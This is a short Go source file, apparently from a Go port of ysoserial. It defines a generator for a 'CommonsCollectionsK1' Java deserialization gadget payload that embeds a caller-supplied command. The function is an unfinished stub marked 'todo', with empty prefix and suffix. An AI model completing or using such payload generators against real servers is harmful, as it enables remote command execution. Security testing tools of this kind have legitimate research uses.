package gadget

import (
	"encoding/hex"
	"github.com/EmYiQing/Gososerial/ysoserial/util"
)

const CCK1 = "CommonsCollectionsK1"

func GetCommonsCollectionsK1(cmd string) []byte {
	// todo
	globalPrefix := ""
	templateImpl := GetKoalrTemplateImpl(cmd)
	templateImplStr := hex.EncodeToString(templateImpl)
	length := len(templateImpl)
	lenStr := util.Int32ToBytes(uint32(length))
	globalSuffix := ""
	temp := globalPrefix + lenStr + templateImplStr + globalSuffix
	data, _ := hex.DecodeString(temp)
	return data
}
